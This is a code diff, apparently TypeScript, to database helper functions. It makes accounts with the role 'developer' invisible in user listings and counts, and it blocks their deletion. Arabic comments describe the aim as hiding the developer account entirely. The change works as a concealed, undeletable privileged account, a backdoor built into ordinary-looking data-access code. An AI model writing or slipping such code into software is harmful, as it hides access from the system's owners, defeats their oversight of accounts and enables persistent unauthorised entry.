@@ -344,6 +344,11 @@ export async function listRows(
     params.push(`${opts.to}T23:59:59.999Z`);
   }
 
+  // إخفاء حساب المطور بالكامل من الاستعلامات العادية
+  if (tableName === 'users' && !opts?.filter?.include_developer) {
+    whereClauses.push("role != 'developer'");
+  }
+
   if (whereClauses.length > 0) {
     sql += ` WHERE ${whereClauses.join(' AND ')}`;
   }
@@ -452,6 +457,12 @@ export async function removeRow(
   id: string
 ): Promise<{ success: boolean }> {
   const tableName = resolveTableName(rawTableName);
+  if (tableName === 'users') {
+    const target = queryOne('SELECT role FROM users WHERE id = ?', [id]);
+    if (target?.role === 'developer') {
+      throw new Error('لا يمكن حذف حساب مطور النظام');
+    }
+  }
   const config = tableConfigs.get(tableName);
   const idField = config?.idField ?? 'id';
   execute(`DELETE FROM ${tableName} WHERE ${idField} = ?`, [id]);
@@ -478,6 +489,10 @@ export async function countRows(
   let sql = `SELECT COUNT(*) as count FROM ${tableName}`;
   const params: unknown[] = [];
   const whereClauses: string[] = [];
+
+  if (tableName === 'users' && !filter?.include_developer) {
+    whereClauses.push("role != 'developer'");
+  }
 
   if (filter && typeof filter === 'object') {
     for (const [key, val] of Object.entries(filter)) {
